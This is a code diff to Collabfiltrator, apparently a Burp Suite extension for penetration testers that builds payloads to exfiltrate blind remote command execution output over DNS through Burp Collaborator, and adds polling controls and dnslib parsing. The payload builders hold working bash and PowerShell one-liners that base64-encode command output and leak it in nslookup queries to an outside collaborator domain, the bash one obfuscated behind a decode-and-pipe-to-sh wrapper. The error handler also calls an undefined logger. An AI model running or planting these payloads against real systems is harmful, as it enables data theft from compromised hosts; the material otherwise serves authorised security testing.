@@ -5,17 +5,22 @@ from java.awt import Dimension, FlowLayout, Color, Toolkit
 from java.awt.datatransfer import Clipboard, StringSelection
 from javax import swing
 from thread import start_new_thread
-import sys, time, threading, base64
+import sys, time, threading, base64, logging, dnslib, binascii, re
 try:
     from exceptions_fix import FixBurpExceptions
 except ImportError:
     pass
     
+
+logging.basicConfig(filename='/tmp/burpCollabfiltrator.log', level=logging.INFO)
+
 class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
     # Extention information
     EXT_NAME = "Collabfiltrator"
     EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
     EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren"
+    global burpCollabInstance 
+    global domain
     # Output info to the Extensions console and register Burp API functions
     def registerExtenderCallbacks(self, callbacks):
         print "Name: \t\t"      + BurpExtender.EXT_NAME
@@ -89,6 +94,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r3.add(self.payloadTxt)
         self.t1r6.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
         self.t1r4.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
+        self.t1r4.add(swing.JButton("Start poll results", actionPerformed=self.startPollResults))
+        self.t1r4.add(swing.JButton("Stop listener", actionPerformed=self.stopPollResults))
         self.t1r5.add(swing.JLabel("Output"))
         self.t1r5.add(self.outputScroll) #add output scroll bar to page
         self.t1r7.add(self.progressBar)
@@ -130,9 +137,10 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{63})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g'); do nslookup `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
+        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g'); do nslookup `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
         return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
 
+    
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
         powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
@@ -148,7 +156,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
             self.payloadTxt.setText(self.createPowershellBase64Payload(self.commandTxt.getText()))
         elif self.osComboBox.getSelectedItem() == "Linux":
             self.payloadTxt.setText(self.createBashBase64Payload(self.commandTxt.getText()))
-        self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
+        #self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
         return
 
     def checkCollabDomainStatusWrapper(self, domain, burpCollab):
@@ -162,12 +170,21 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         data = StringSelection(self.payloadTxt.getText())
         clipboard.setContents(data, None)
         return    
+    
+    # start listen
+    def startPollResults(self, event):
+        self.checkCollabDomainStatusWrapper(self.collaboratorDomain, self.burpCollab)
+
+
+    def stopPollResults(self, event):
+        self.pollstop = True
 
     #monitor collab domain for output response
     def checkCollabDomainStatus(self, domain, objCollab):
         DNSrecordDict = dict()#since data comes in out of order we have to line up each request with it's timestamp
         #recordType = "A" #01
         complete = False
+        self.pollstop = False
         #recordType = "AAAA" #1C or int(28)
         #recordType = "MX" #00 ?
         sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.
@@ -179,32 +196,50 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
             self.progressBar.setVisible(True) #show progress bar
             self.progressBar.setIndeterminate(True) #make progress bar show listener is running
             check = objCollab.fetchCollaboratorInteractionsFor(domain)
+            
+            self.outputTxt.setText("Domains: " + domain + "\n")
             time.sleep(1)
             loopCount += 1
             oldkeys = DNSrecordDict.keys()
 
             for i in range(0, len(check)):
-                dnsQuery = self._helpers.base64Decode(check[i].getProperty('raw_query'))
-                preambleOffset = int(dnsQuery[12])
-                dnsOffset = int(dnsQuery[17])
-                subdomain = ''.join(chr (x) for x in dnsQuery[18:(18+dnsOffset)])
-                chunk = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
-                DNSrecordDict[chunk] = subdomain #line up preamble with subdomain containing data
+                try:
+                    # we use dnslib to parse the result
+                    packet = binascii.a2b_base64(check[i].getProperty('raw_query'))
+                    dnsQuery = str(dnslib.DNSRecord.parse(packet).questions[0])
+                    dnsQuery = dnsQuery.replace(';','').replace('IN      A','').replace(' ','')
+                    logging.info("raw: %s", dnsQuery)
+                    logging.info("allllll: {}".format(check[i].getProperties()))
+                    
+                    r = re.search("^\d\d\d\d\.", dnsQuery)
+                    if r:
+                        chunk = r.group().replace(".", '')
+                        subdomain = re.findall(r"\S+?\.", dnsQuery)[1].replace(".",'')
+                        DNSrecordDict[chunk] = subdomain
+                    
+                    logging.info("recorad: {}".format(DNSrecordDict))
+                except Exception as e:
+                    logger.error('Failed to upload to ftp: '+ str(e))
             
             ### Check if input stream is done.
             keys = DNSrecordDict.keys()
+            if self.pollstop == True:
+                break
             if keys == oldkeys and keys != []:
                 sameCounter += 1
             elif keys != oldkeys and keys != []:
                 sameCounter = 0
-            if sameCounter == 5:
+            if sameCounter == 20:
                 complete = True
             if loopCount == 61:
                 self.outputTxt.setText("Error: Listener Timeout." + "\n")
+
+        # End loop, clear the progress bar
         self.progressBar.setVisible(False) # hide progressbar
         self.progressBar.setIndeterminate(False) #turn off progressbar
 
         output = showOutput(DNSrecordDict)
+        logging.info("output: %s", output)
         self.outputTxt.append(output + "\n") #print output to payload box
         self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
         self.payloadTxt.setText("") #clear out payload box because listener has stopped     
